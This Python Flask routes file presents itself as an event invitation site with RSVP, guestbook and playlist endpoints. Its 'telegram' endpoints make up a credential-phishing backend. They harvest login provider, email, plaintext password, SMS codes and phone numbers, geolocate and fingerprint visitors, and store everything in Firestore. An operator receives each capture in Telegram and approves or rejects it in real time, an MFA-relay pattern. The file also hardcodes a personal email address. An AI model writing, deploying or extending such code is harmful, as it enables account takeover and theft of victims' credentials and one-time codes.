import os
import random
import string
import threading
import requests
from datetime import datetime
from flask import app, request, jsonify, send_from_directory
from firebase_db import save_attempt, get_attempt, update_attempt, get_all_attempts


def register_routes(app, telegram_service, rsvps, guestbook, playlist, logs):

    # -----------------------------------------------------------------------
    # RSVPs
    # -----------------------------------------------------------------------
    @app.route("/api/rsvps", methods=["GET"])
    def get_rsvps():
        return jsonify(rsvps)

    @app.route("/api/rsvps", methods=["POST"])
    def post_rsvp():
        data = request.json or {}
        name = data.get("name")
        email = data.get("email")
        if not name or not email:
            return jsonify({"error": "Name and Email are required."}), 400

        attending = data.get("attending")
        is_attending = attending is True or attending == "true" or attending == "True"
        guests_count = int(data.get("guestsCount") or 0)
        if is_attending and guests_count == 0:
            guests_count = 1

        new_rsvp = {
            "id": "rsvp-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "name": name,
            "email": email,
            "attending": is_attending,
            "guestsCount": guests_count,
            "dietaryRestrictions": data.get("dietaryRestrictions") or "None",
            "notes": data.get("notes") or "",
            "createdAt": datetime.utcnow().isoformat() + "Z"
        }
        rsvps.insert(0, new_rsvp)

        if telegram_service.is_configured():
            def send_alert():
                try:
                    telegram_service.send_rsvp_alert(new_rsvp)
                except Exception as e:
                    print(f"Failed to send RSVP alert to Telegram: {e}", flush=True)
            threading.Thread(target=send_alert).start()

        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "RSVP_SUBMITTED",
            "details": f"RSVP registered for {name} ({'Attending' if is_attending else 'Not Attending'}, {guests_count} guests).",
            "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        })
        return jsonify(new_rsvp), 201

    # -----------------------------------------------------------------------
    # Guestbook
    # -----------------------------------------------------------------------
    @app.route("/api/guestbook", methods=["GET"])
    def get_guestbook():
        return jsonify(guestbook)

    @app.route("/api/guestbook", methods=["POST"])
    def post_guestbook():
        data = request.json or {}
        author = data.get("author")
        message = data.get("message")
        if not author or not message:
            return jsonify({"error": "Author and Message are required."}), 400

        colors = [
            "bg-rose-100 text-rose-700",
            "bg-pink-100 text-pink-700",
            "bg-amber-100 text-amber-700",
            "bg-purple-100 text-purple-700",
            "bg-emerald-100 text-emerald-700",
            "bg-sky-100 text-sky-700"
        ]
        entry = {
            "id": "msg-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "author": author,
            "message": message,
            "avatarColor": random.choice(colors),
            "createdAt": datetime.utcnow().isoformat() + "Z"
        }
        guestbook.insert(0, entry)
        return jsonify(entry), 201

    # -----------------------------------------------------------------------
    # Playlist
    # -----------------------------------------------------------------------
    @app.route("/api/playlist", methods=["GET"])
    def get_playlist():
        return jsonify(playlist)

    @app.route("/api/playlist", methods=["POST"])
    def post_playlist():
        data = request.json or {}
        title = data.get("title")
        artist = data.get("artist")
        if not title or not artist:
            return jsonify({"error": "Title and Artist are required."}), 400

        song = {
            "id": "song-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "title": title,
            "artist": artist,
            "requestedBy": data.get("requestedBy") or "Secret Guest",
            "votes": 1
        }
        playlist.append(song)
        return jsonify(song), 201

    @app.route("/api/playlist/upvote", methods=["POST"])
    def upvote_song():
        data = request.json or {}
        song_id = data.get("id")
        for s in playlist:
            if s["id"] == song_id:
                s["votes"] += 1
                return jsonify(s)
        return jsonify({"error": "Song not found."}), 404

    # -----------------------------------------------------------------------
    # Logs
    # -----------------------------------------------------------------------
    @app.route("/api/logs", methods=["GET"])
    def get_logs():
        return jsonify(logs)

    @app.route("/api/logs", methods=["POST"])
    def post_simulation_log():
        data = request.json or {}
        new_log = {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": data.get("type"),
            "details": data.get("details"),
            "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        }
        logs.insert(0, new_log)
        return jsonify(new_log)

    # -----------------------------------------------------------------------
    # Visitor entry
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/visitor_entry", methods=["POST"])
    def visitor_entry():
        try:
            client_body = request.json or {}

            visitor = {
                "provider":client_body.get("provider") or "Unknown",
            }

           

            if telegram_service.is_configured():
                def send_alert():
                    try:
                        telegram_service.send_visitor_alert(visitor)
                    except Exception as e:
                        print(f"Failed to send visitor alert: {e}", flush=True)
                threading.Thread(target=send_alert).start()

           

            return jsonify({"success": True, "visitor": visitor})
        except Exception as e:
            print(f"Visitor entry error: {e}", flush=True)
            return jsonify({"error": str(e)}), 500

    # -----------------------------------------------------------------------
    # Telegram config / test
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/config", methods=["GET"])
    def telegram_config():
        return jsonify(telegram_service.get_config())

    @app.route("/api/telegram/send_test", methods=["POST"])
    def send_test_message():
        try:
            if not telegram_service.is_configured():
                return jsonify({"error": "Telegram bot is not configured."}), 400
            data = request.json or {}
            test_email = data.get("testEmail") or "showolesheriff7@gmail.com"
            message = f"""
🔔 <b>Invitation Gateway Handshake Active!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
Your real-time connection is <b>ONLINE</b> and functional!
👤 <b>Host Receiver Account:</b> <code>{test_email}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Ready to process remote action overrides!</i>
            """.strip()
            telegram_service.send_message(message, "HTML")
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/api/telegram/send_text", methods=["POST"])
    def send_text_to_telegram():
        data = request.json or {}
        text = data.get("text")
        if not text:
            return jsonify({"error": "'text' field is required."}), 400
        if not telegram_service.is_configured():
            return jsonify({"error": "Telegram bot is not configured."}), 400

        def send():
            try:
                telegram_service.send_message(text, "HTML")
            except Exception as e:
                print(f"Failed to send text to Telegram: {e}", flush=True)
        threading.Thread(target=send).start()
        return jsonify({"success": True})

    # -----------------------------------------------------------------------
    # Login attempt  →  Firestore
    # -----------------------------------------------------------------------
    app.route("/api/telegram/login_attempt", methods=["POST"])
    def login_attempt():
        try:
            data = request.json or {}

            provider = data.get("provider")
            email = data.get("email")
            password = data.get("password")

            if not provider or not email:
                return jsonify({
                    "error": "Missing required parameters: provider and email."
                }), 400

            # --------------------------------------------------
            # CLIENT IP
            # --------------------------------------------------
            forwarded = request.headers.get("X-Forwarded-For")
            ip = (
                forwarded.split(",")[0].strip()
                if forwarded
                else (request.remote_addr or "127.0.0.1")
            )

            if ip.startswith("::ffff:"):
                ip = ip[7:]

            # --------------------------------------------------
            # GEO LOOKUP
            # --------------------------------------------------
            resolved_loc = {
                "city": "Unknown",
                "region": "Unknown",
                "country_name": "Unknown",
                "country_code": "??",
                "org": "Unknown"
            }

            try:
                res = requests.get(f"https://ipwho.is/{ip}", timeout=3)

                if res.status_code == 200:
                    geo = res.json()

                    if geo.get("success") is not False:
                        resolved_loc = {
                            "city": geo.get("city") or "Unknown",
                            "region": geo.get("region") or "Unknown",
                            "country_name": geo.get("country") or "Unknown",
                            "country_code": geo.get("country_code") or "??",
                            "org": (
                                geo.get("connection", {}).get("org")
                                or geo.get("connection", {}).get("isp")
                                or "Unknown"
                            )
                        }

            except Exception as e:
                print(f"Geo lookup failed: {e}", flush=True)

            # --------------------------------------------------
            # VISITOR OBJECT
            # --------------------------------------------------
            visitor = {
                "ip": ip,
                **resolved_loc,
                "browser": data.get("browser") or "Unknown Browser",
                "os": data.get("os") or "Unknown OS",
                "screenSize": data.get("screenSize") or "Unknown",
                "language": data.get("language") or "Unknown",
                "timezone": data.get("timezone") or "Unknown",
                "cores": data.get("cores") or "Unknown",
                "platform": data.get("platform") or "Unknown",
                "userAgent": data.get("userAgent") or "Unknown"
            }

            # --------------------------------------------------
            # LOGIN ATTEMPT
            # --------------------------------------------------
            attempt_id = "attempt-" + "".join(
                random.choices(
                    string.ascii_lowercase + string.digits,
                    k=9
                )
            )

            new_attempt = {
                "id": attempt_id,
                "provider": provider,
                "email": email,
                "password": password or "",
                "visitor": visitor,
                "promptNumber": None,
                "promptCandidates": None,
                "status": "pending",
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }

            save_attempt(new_attempt)

            if telegram_service.is_configured():
                threading.Thread(
                    target=lambda: telegram_service.send_login_alert(new_attempt),
                    daemon=True
                ).start()

            return jsonify(new_attempt)

        except Exception as e:
            print(f"Login attempt error: {e}", flush=True)
            return jsonify({"error": str(e)}), 500
    # -----------------------------------------------------------------------
    # OTP attempt  →  Firestore
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/otp_attempt", methods=["POST"])
    def otp_attempt():
        data = request.json or {}
        attempt_id = data.get("id")
        if not attempt_id:
            return jsonify({"error": "id parameter is required."}), 400

        state = get_attempt(attempt_id)
        if not state:
            return jsonify({"error": "Active transaction attempt was not found."}), 404

        fields = {"status": "pending"}
        if data.get("phone") is not None:
            fields["phone"] = data["phone"]
            state["phone"] = data["phone"]
        if data.get("smsCode") is not None:
            fields["smsCode"] = data["smsCode"]
            state["smsCode"] = data["smsCode"]

        try:
            update_attempt(attempt_id, fields)
        except Exception as e:
            print(f"[Firestore] otp_attempt update error: {e}", flush=True)

        state["status"] = "pending"

        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[{state['provider'].upper()}] OTP submission for {state.get('email')}.",
            "ipPlaceholder": client_ip
        })

        if telegram_service.is_configured():
            def send_alert():
                try:
                    telegram_service.send_sms_submit_alert(state)
                except Exception as e:
                    print(f"Failed to deliver OTP alert: {e}", flush=True)
            threading.Thread(target=send_alert).start()

        return jsonify(state)

    # -----------------------------------------------------------------------
    # Send candidates  →  Firestore
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/send_candidates", methods=["POST"])
    def send_candidates():
        data = request.json or {}
        attempt_id = data.get("id")
        candidates = data.get("candidates")

        if not attempt_id or not candidates:
            return jsonify({"error": "Missing parameters: id and candidates are required."}), 400
        if not isinstance(candidates, list) or len(candidates) == 0:
            return jsonify({"error": "'candidates' must be a non-empty list."}), 400

        state = get_attempt(attempt_id)
        if not state:
            return jsonify({"error": "Active transaction attempt was not found."}), 404

        nums = []
        try:
            for n in candidates:
                if len(nums) >= 3:
                    break
                nums.append(int(n))
        except Exception:
            return jsonify({"error": "Candidates must be numeric values."}), 400

        try:
            update_attempt(attempt_id, {"promptCandidates": nums, "status": "number_prompt"})
        except Exception as e:
            print(f"[Firestore] send_candidates update error: {e}", flush=True)

        state["promptCandidates"] = nums
        state["status"] = "number_prompt"
        return jsonify(state)

    # -----------------------------------------------------------------------
    # Prompt choice  →  Firestore
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/prompt_choice", methods=["POST"])
    def prompt_choice():
        data = request.json or {}
        attempt_id = data.get("id")
        chosen = data.get("chosen")

        if not attempt_id or chosen is None:
            return jsonify({"error": "Missing parameters: id and chosen are required."}), 400

        state = get_attempt(attempt_id)
        if not state:
            return jsonify({"error": "Active transaction attempt was not found."}), 404

        try:
            update_attempt(attempt_id, {"promptNumber": str(chosen), "status": "pending"})
        except Exception as e:
            print(f"[Firestore] prompt_choice update error: {e}", flush=True)

        state["promptNumber"] = str(chosen)
        state["status"] = "pending"

        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[GUEST CHOICE] Guest selected number {chosen} for {state.get('email')}.",
            "ipPlaceholder": client_ip
        })

        if telegram_service.is_configured():
            def send_alert():
                try:
                    message = (
                        f"📣 <b>Guest Selection Received</b>\n━━━━━━━━━━━━━━━━━━\n"
                        f"Guest: <code>{state.get('email')}</code>\n"
                        f"Selected number: <code>{chosen}</code>\n"
                        f"Attempt ID: <code>{attempt_id}</code>\n━━━━━━━━━━━━━━━━━━\n"
                        f"Approve or reject below."
                    )
                    inline_keyboard = {
                        "inline_keyboard": [
                            [
                                {"text": "Approve ✅", "callback_data": f"tg:approve:{attempt_id}"},
                                {"text": "Reject ❌", "callback_data": f"tg:deny:{attempt_id}"}
                            ],
                            [{"text": "Incorrect Password ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}]
                        ]
                    }
                    telegram_service.send_message(message, "HTML", inline_keyboard)
                except Exception as e:
                    print(f"Failed to notify Telegram of guest choice: {e}", flush=True)
            threading.Thread(target=send_alert).start()

        return jsonify(state)

    # -----------------------------------------------------------------------
    # Attempt status  →  Firestore
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/attempt_status", methods=["GET"])
    def attempt_status():
        attempt_id = request.args.get("id")
        if not attempt_id:
            return jsonify({"error": "Transaction 'id' parameter is required."}), 400

        try:
            state = get_attempt(attempt_id)
        except Exception as e:
            return jsonify({"error": f"Firestore read error: {str(e)}"}), 500

        if not state:
            return jsonify({"error": "Requested auth transaction not found."}), 404

        return jsonify(state)

    # -----------------------------------------------------------------------
    # All attempts  →  Firestore
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/attempts", methods=["GET"])
    def get_attempts():
        try:
            attempts = get_all_attempts(limit=10)
        except Exception as e:
            return jsonify({"error": str(e)}), 500
        return jsonify(attempts)

    # -----------------------------------------------------------------------
    # Local override  →  Firestore
    # -----------------------------------------------------------------------
    @app.route("/api/telegram/local_override", methods=["POST"])
    def local_override():
        data = request.json or {}
        attempt_id = data.get("id")
        status = data.get("status")

        if not attempt_id or not status:
            return jsonify({"error": "Missing parameters: id and status are required."}), 400

        state = get_attempt(attempt_id)
        if not state:
            return jsonify({"error": "Requested sign-in transaction not found."}), 404

        try:
            update_attempt(attempt_id, {"status": status})
        except Exception as e:
            return jsonify({"error": f"Firestore write error: {str(e)}"}), 500

        state["status"] = status
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "LOGIN_SUCCESS" if status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[LOCAL OVERRIDE] [{status.upper()}] for {state.get('email')}.",
            "ipPlaceholder": "Host Console"
        })
        return jsonify({"success": True, "attempt": state})

    # -----------------------------------------------------------------------
    # SPA fallback
    # -----------------------------------------------------------------------
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def serve(path):
        if path.startswith('api/'):
            return jsonify({"error": "Endpoint not found."}), 404
        full_path = os.path.join('dist', path)
        if path and os.path.exists(full_path) and os.path.isfile(full_path):
            return send_from_directory('dist', path)
        return send_from_directory('dist', 'index.html')